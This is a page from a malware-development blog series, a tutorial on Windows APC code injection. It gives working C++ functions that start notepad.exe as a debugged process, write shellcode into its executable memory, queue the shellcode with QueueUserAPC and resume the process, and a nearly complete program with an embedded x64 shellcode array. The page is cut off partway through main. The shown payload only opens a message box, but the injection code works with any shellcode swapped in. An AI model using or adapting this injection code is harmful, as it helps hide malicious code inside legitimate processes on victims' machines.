# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <h1 id="introduction-to-apc-injection">Introduction to APC Injection<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#introduction-to-apc-injection" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>APC refers to Asynchronous Procedure Call, and APC Injection is one variation of the techniques of code injection in Windows. APC Injection targets threads that are in an ALERTABLE state. Every thread has it’s own queue of APCs, when the thread enters an alertable state it starts doing APC jobs in the form of first in first out.</p>

<p>In threading, an “alertable state” refers to a condition where a thread is capable of receiving and processing asynchronous alerts or signals while it’s in a waiting or blocked state. In other words, when a thread is in an alertable state, it remains receptive to certain asynchronous events or notifications, allowing it to perform additional actions or respond to specific signals without being actively engaged in processing tasks.</p>

<p>A thread enters an alertable state in specific scenarios where it is capable of receiving and processing asynchronous alerts:</p>
<ul>
  <li>Waiting on I/O Completion Ports</li>
  <li>Waiting on Synchronization Objects: When a thread waits on certain synchronization objects such as mutexes, semaphores, events, or condition variables using functions like <code class="language-plaintext highlighter-rouge">WaitForSingleObjectEx</code>, <code class="language-plaintext highlighter-rouge">WaitForMultipleObjectsEx</code>, or <code class="language-plaintext highlighter-rouge">SleepEx</code>.</li>
  <li><strong>Asynchronous Procedure Calls (APCs)</strong>: Threads that explicitly enter an alertable state by calling functions like <code class="language-plaintext highlighter-rouge">SleepEx</code>, <code class="language-plaintext highlighter-rouge">WaitForSingleObjectEx</code></li>
  <li><strong>Custom Alertable States</strong>: In some cases, developers may implement custom mechanisms to put threads in an alertable state.</li>
</ul>

<p>In order to perform APC Injection, we need to create or have a ready thread in an alertable state, in this article we will be creating a new remote process in <code class="language-plaintext highlighter-rouge">DEBUG</code> mode.</p>

<p>Debug mode is an alertable state for process threads primarily because it allows the operating system to interrupt the normal execution flow of a thread to handle debugging-related events or signals. When a thread is in debug mode, it becomes receptive to asynchronous alerts or signals from the debugger.</p>

<p>In Windows operating systems, <code class="language-plaintext highlighter-rouge">DebugActivateProcessStop</code> is a function used to activate a thread that is in a stopped state due to debugging. It’s part of the debugging API and is primarily employed to resume the execution of a thread that has been halted for debugging purposes. As we will be creating a process in debug mode we will need to use this API so we can activate the thread again after injection.</p>

<h1 id="creating-a-debugged-process">Creating a debugged process<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#creating-a-debugged-process" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>We will be using <code class="language-plaintext highlighter-rouge">CreateProcess</code> API call, it will not be explained in depth as it is explained more <a href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-08/">here</a>.</p>

<p>We will be passing <code class="language-plaintext highlighter-rouge">DEBUG_PROCESS</code> as a creation flag in the place of<code class="language-plaintext highlighter-rouge">dwCreationFlags</code> parameter so we can create a debugged process.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CreateDebuggedProcess</span><span class="p">(</span><span class="n">IN</span> <span class="n">LPCSTR</span> <span class="n">lpProcessName</span><span class="p">,</span><span class="n">OUT</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">dwProcessId</span><span class="p">,</span><span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">,</span><span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hThread</span><span class="p">)</span> <span class="p">{</span>

  <span class="n">CHAR</span> <span class="n">lpPath</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">*</span> <span class="mi">2</span><span class="p">];</span>
  <span class="n">CHAR</span> <span class="n">WnDr</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>

  <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

  <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

  <span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS_INFORMATION</span><span class="p">));</span>
  <span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">));</span>

  <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetEnvironmentVariableA</span><span class="p">(</span><span class="s">"WINDIR"</span><span class="p">,</span> <span class="n">WnDr</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">))</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"GetEnvironmentVariableA failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>

  <span class="p">}</span>

  <span class="n">sprintf</span><span class="p">(</span><span class="n">lpPath</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">%s"</span><span class="p">,</span> <span class="n">WnDr</span><span class="p">,</span><span class="n">lpProcessName</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">lpPath</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">FALSE</span><span class="p">,</span>
    <span class="n">DEBUG_PROCESS</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span>
    <span class="o">&amp;</span><span class="n">pi</span>
    <span class="p">))</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"CreateProcessA failed with error %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="o">*</span><span class="n">hProcess</span> <span class="o">=</span> <span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">;</span>
  <span class="o">*</span><span class="n">dwProcessId</span> <span class="o">=</span> <span class="n">pi</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">;</span>
  <span class="o">*</span><span class="n">hThread</span> <span class="o">=</span> <span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>


<span class="p">}</span>
</code></pre></div></div>

<p>As we can see we are using <code class="language-plaintext highlighter-rouge">sprintf</code> to concatenate the full path of our process getting the WINDIR environment variable is more convenient than hardcoding everything.</p>

<p>Also the empty placeholders for PID, Process Name and Thread handles are passed in order we can save the retrieved values of our debugged process because once the function exists we lose everything in <code class="language-plaintext highlighter-rouge">pi</code> variable.</p>

<h1 id="injecting-shellcode-inside-remote-process-memory">Injecting shellcode inside remote process memory<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#injecting-shellcode-inside-remote-process-memory" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Next step after retrieving a handle to the target process we will be injecting our code in an EXECUTABLE region, we can use <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> directly or combine it with <code class="language-plaintext highlighter-rouge">VirtualProtect</code> for more stealthy approach:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">InjectShellcode</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">ppAddress</span><span class="p">)</span> <span class="p">{</span>


  <span class="n">SIZE_T</span> <span class="n">dwNumberofBbytesWritten</span><span class="p">;</span>
  <span class="o">*</span><span class="n">ppAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">ppAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualAlloc failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">*</span><span class="n">ppAddress</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwNumberofBbytesWritten</span><span class="p">)</span> <span class="o">||</span> <span class="n">dwNumberofBbytesWritten</span> <span class="o">!=</span> <span class="n">SizeofShellcode</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"WriteProcessMemory failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div>

<p>As we see the out parameter in this case is <code class="language-plaintext highlighter-rouge">ppAddress</code> the address of our shellcode.</p>

<p>For more explaniation of shellcode injection check past articles.</p>

<p>We have all what we need now,:</p>

<ul>
  <li>A debugged process.</li>
  <li>A Handle to that process.</li>
  <li>A Handle to one of its alertable-state threads.</li>
  <li>An executable address that hold injected shellcode.</li>
</ul>

<p>Next we will need to implement the injection routine itself.</p>

<h1 id="triggering-the-payload">Triggering the payload<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#triggering-the-payload" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>We will be using <code class="language-plaintext highlighter-rouge">QueueUserAPC</code> to trigger our shellcode:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">QueueUserAPC</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">PAPCFUNC</span>  <span class="n">pfnAPC</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">ULONG_PTR</span> <span class="n">dwData</span>
<span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">[in] pfnAPC</code></p>

<p>A pointer to the application-supplied APC function to be called when the specified thread performs an alertable wait operation.</p>

<p><code class="language-plaintext highlighter-rouge">[in] hThread</code>:</p>

<p>A handle to the thread. The handle must have the  <strong>THREAD_SET_CONTEXT</strong>  access right.</p>

<p><code class="language-plaintext highlighter-rouge">[in] dwData</code>:</p>

<p>A single value that is passed to the APC function pointed to by the  <em>pfnAPC</em>  parameter.</p>

<p><code class="language-plaintext highlighter-rouge">QueueUserAPC</code> allows a thread to queue a user-mode asynchronous procedure call (APC) to the APC queue of another thread. This means that code provided by us can be executed asynchronously within the context of the target thread.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pfnAPC</code>: The address of our shellcode.</li>
  <li><code class="language-plaintext highlighter-rouge">hThread</code>: A handle to the alertable state.</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="o">*</span><span class="n">pAddress</span><span class="p">,</span> <span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"QueueUserAPC failed with error %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>And then as we said before we need to activate the thread, using:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">DebugActiveProcessStop</span><span class="p">(</span><span class="o">*</span><span class="n">dwProcessId</span><span class="p">);</span>
</code></pre></div></div>

<p>Full function:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="nf">APCInjection</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hThread</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">pAddress</span><span class="p">,</span> <span class="n">IN</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">dwProcessId</span><span class="p">)</span> <span class="p">{</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="o">*</span><span class="n">pAddress</span><span class="p">,</span> <span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"QueueUserAPC failed with error %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">DebugActiveProcessStop</span><span class="p">(</span><span class="o">*</span><span class="n">dwProcessId</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<h1 id="tracing-execution">Tracing execution<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#tracing-execution" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>To make sure everything is correctly happening we can put some breakpoints here and there and trace the execution:</p>

<h2 id="process-creation">Process Creation<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#process-creation" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>If we breakpoint after the process creation function we can see that our process has been created:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/9-0.png" alt="P0">
<img src="https://ry0dan.github.io/assets/images/malware-development/9-1.png" alt="P1"></p>

<h2 id="injection">Injection<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#injection" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Breakpoint after The injection function and observe the memory address returned and its permissions.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/9-2.png" alt="P2">
<img src="https://ry0dan.github.io/assets/images/malware-development/9-3.png" alt="P3"></p>

<h2 id="thread-resuming">Thread resuming<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#thread-resuming" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>Continue the execution and you’ll get the messagebox triggered.
<img src="https://ry0dan.github.io/assets/images/malware-development/9-4.png" alt="P3"></p>

<h1 id="final-code" class="active">Final code<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-09/#final-code" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="kt">bool</span> <span class="nf">APCInjection</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hThread</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">pAddress</span><span class="p">,</span> <span class="n">IN</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">dwProcessId</span><span class="p">)</span> <span class="p">{</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="o">*</span><span class="n">pAddress</span><span class="p">,</span> <span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"QueueUserAPC failed with error %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">DebugActiveProcessStop</span><span class="p">(</span><span class="o">*</span><span class="n">dwProcessId</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>


<span class="n">BOOL</span> <span class="n">CreateDebuggedProcess</span><span class="p">(</span><span class="n">IN</span> <span class="n">LPCSTR</span> <span class="n">lpProcessName</span><span class="p">,</span><span class="n">OUT</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">dwProcessId</span><span class="p">,</span><span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">,</span><span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hThread</span><span class="p">)</span> <span class="p">{</span>

  <span class="n">CHAR</span> <span class="n">lpPath</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">*</span> <span class="mi">2</span><span class="p">];</span>
  <span class="n">CHAR</span> <span class="n">WnDr</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>

  <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

  <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

  <span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS_INFORMATION</span><span class="p">));</span>
  <span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">));</span>

  <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetEnvironmentVariableA</span><span class="p">(</span><span class="s">"WINDIR"</span><span class="p">,</span> <span class="n">WnDr</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">))</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"GetEnvironmentVariableA failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>

  <span class="p">}</span>

  <span class="n">sprintf</span><span class="p">(</span><span class="n">lpPath</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">%s"</span><span class="p">,</span> <span class="n">WnDr</span><span class="p">,</span><span class="n">lpProcessName</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">lpPath</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">FALSE</span><span class="p">,</span>
    <span class="n">DEBUG_PROCESS</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span>
    <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span>
    <span class="o">&amp;</span><span class="n">pi</span>
    <span class="p">))</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"CreateProcessA failed with error %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="o">*</span><span class="n">hProcess</span> <span class="o">=</span> <span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">;</span>
  <span class="o">*</span><span class="n">dwProcessId</span> <span class="o">=</span> <span class="n">pi</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">;</span>
  <span class="o">*</span><span class="n">hThread</span> <span class="o">=</span> <span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>


<span class="p">}</span>


<span class="n">BOOL</span> <span class="n">InjectShellcode</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">ppAddress</span><span class="p">)</span> <span class="p">{</span>


  <span class="n">SIZE_T</span> <span class="n">dwNumberofBbytesWritten</span><span class="p">;</span>
  <span class="o">*</span><span class="n">ppAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">ppAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"VirtualAlloc failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">*</span><span class="n">ppAddress</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwNumberofBbytesWritten</span><span class="p">)</span> <span class="o">||</span> <span class="n">dwNumberofBbytesWritten</span> <span class="o">!=</span> <span class="n">SizeofShellcode</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"WriteProcessMemory failed with error %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>

<span class="p">}</span>



<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>

  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span>
    <span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x4c\x8d\x85\x15\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd5\x43\x52\x41\x46\x54\x49\x4e\x47\x20\x44\x49\x47\x49</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x54\x41\x4c\x20\x43\x48\x41\x4f\x53\x00\x4d\x65\x73\x73</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x61\x67\x65\x42\x6f\x78\x00</span><span class="s">"</span><span class="p">;</span>

  <span class="n">CHAR</span> <span class="n">Pname</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"notepad.exe"</span><span class="p">;</span>
  
